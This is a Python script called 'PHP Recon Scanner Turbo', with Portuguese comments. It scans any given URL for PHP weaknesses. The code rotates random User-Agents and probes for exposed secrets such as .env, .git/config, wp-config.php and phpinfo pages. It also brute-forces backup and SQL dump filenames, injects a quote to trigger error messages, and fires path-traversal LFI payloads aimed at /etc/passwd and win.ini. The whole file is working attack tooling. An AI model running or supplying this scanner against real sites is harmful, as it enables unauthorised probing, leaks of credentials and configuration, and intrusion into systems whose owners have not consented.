php_recon.py         
#!/usr/bin/env python3

import requests
from urllib.parse import urljoin
import re
import random
import argparse

# Timeouts e User-Agents randômicos
TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Windows NT 10.0; rv:90.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

PHP_SENSITIVE_PATHS = [
    "phpinfo.php",
    "info.php",
    "test.php",
    "php.php",
    "admin/phpinfo.php",
    "admin/info.php",
    "admin/test.php",
    "phpmyadmin/",
    "adminer.php",
    ".env",
    ".git/config",
    ".htaccess",
    "config.php",
    "wp-config.php",
    "composer.json",
    "vendor/autoload.php",
]

BRUTE_FORCE_FILES = [
    "backup.zip",
    "db.sql",
    "dump.sql",
    "backup.tar.gz",
    "old-site.zip",
    "backup.bak",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
]

PHP_ERROR_PATTERNS = [
    r"Fatal error:",
    r"Warning:",
    r"Notice:",
    r"on line [0-9]+",
    r"in <b>(.*?)</b>",
]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS)
    }

def check_php_headers(url):
    try:
        response = requests.get(url, headers=get_headers(), timeout=TIMEOUT)
        server = response.headers.get("Server", "")
        x_powered = response.headers.get("X-Powered-By", "")
        if "PHP" in server or "PHP" in x_powered:
            print(f"[+] Possível versão PHP nos headers:")
            print(f"    Server: {server}")
            print(f"    X-Powered-By: {x_powered}")
    except Exception as e:
        print(f"[-] Erro ao checar headers: {e}")

def scan_sensitive_paths(base_url):
    print("\n[+] Buscando arquivos e paths sensíveis...")
    for path in PHP_SENSITIVE_PATHS:
        full_url = urljoin(base_url, path)
        try:
            r = requests.get(full_url, headers=get_headers(), timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text) > 10:
                print(f"[!] Encontrado: {path} - POSSÍVEL VAZAMENTO: {full_url}")
        except Exception:
            continue

def brute_force_files(base_url):
    print("\n[+] Brute-force de arquivos de backup...")
    for file in BRUTE_FORCE_FILES:
        full_url = urljoin(base_url, file)
        try:
            r = requests.head(full_url, headers=get_headers(), timeout=TIMEOUT)
            if r.status_code == 200:
                print(f"[!] Arquivo encontrado: {full_url}")
        except Exception:
            continue

def search_php_errors(base_url):
    print("\n[+] Forçando resposta com possível erro PHP...")
    test_param = "?id='"
    test_url = base_url.rstrip("/") + "/" + test_param
    try:
        r = requests.get(test_url, headers=get_headers(), timeout=TIMEOUT)
        for pattern in PHP_ERROR_PATTERNS:
            if re.search(pattern, r.text, re.IGNORECASE):
                print(f"[!] Mensagem de erro detectada: '{pattern}' em {test_url}")
    except Exception as e:
        print(f"[-] Erro ao buscar mensagens de erro: {e}")

def lfi_rfi_test(base_url):
    print("\n[+] Testando parâmetros vulneráveis a LFI/RFI...")
    for payload in LFI_PAYLOADS:
        lfi_url = f"{base_url}?file={payload}"
        try:
            r = requests.get(lfi_url, headers=get_headers(), timeout=TIMEOUT)
            if "root:" in r.text or "[extensions]" in r.text:
                print(f"[!] POSSÍVEL LFI detectado: {lfi_url}")
        except Exception:
            continue

def check_dir_permissions(base_url):
    print("\n[+] Verificando permissões de diretórios comuns...")
    common_dirs = ["admin/", "phpmyadmin/", "uploads/", "backup/", "logs/"]
    for d in common_dirs:
        dir_url = urljoin(base_url, d)
        try:
            r = requests.get(dir_url, headers=get_headers(), timeout=TIMEOUT)
            if r.status_code in [200, 403, 401]:
                print(f"[+] Diretório {d} retornou código {r.status_code}: {dir_url}")
        except Exception:
            continue

def fingerprint_phpinfo(base_url):
    print("\n[+] Testando fingerprint via /?=phpinfo()...")
    url = base_url.rstrip("/") + "/?=phpinfo()"
    try:
        r = requests.get(url, headers=get_headers(), timeout=TIMEOUT)
        if "phpinfo()" in r.text:
            print(f"[!] phpinfo() exposto em: {url}")
    except Exception:
        pass

def main():
    parser = argparse.ArgumentParser(description="PHP Recon Scanner Turbo")
    parser.add_argument("--url", required=True, help="URL alvo (ex.: https://example.com/)")
    args = parser.parse_args()

    target = args.url.strip()
    if not target.startswith("http"):
        print("[-] URL inválida. Use http ou https.")
        return

    print("=== PHP Recon Scanner Turbo ===")
    check_php_headers(target)
    scan_sensitive_paths(target)
    brute_force_files(target)
    search_php_errors(target)
    lfi_rfi_test(target)
    check_dir_permissions(target)
    fingerprint_phpinfo(target)

if __name__ == "__main__":
    main()
